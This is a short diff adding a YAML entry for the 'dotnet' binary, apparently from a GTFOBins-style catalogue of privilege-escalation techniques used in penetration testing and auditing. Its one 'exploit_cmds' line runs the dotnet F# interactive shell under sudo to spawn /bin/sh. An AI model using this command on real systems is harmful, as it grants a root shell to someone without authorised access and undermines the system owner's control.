@@ -1,0 +1,4 @@
+name: dotnet
+binary_path: /usr/bin/dotnet
+exploit_cmds:
+- sudo /usr/bin/dotnet fsi && System.Diagnostics.Process.Start("/bin/sh").WaitForExit();;
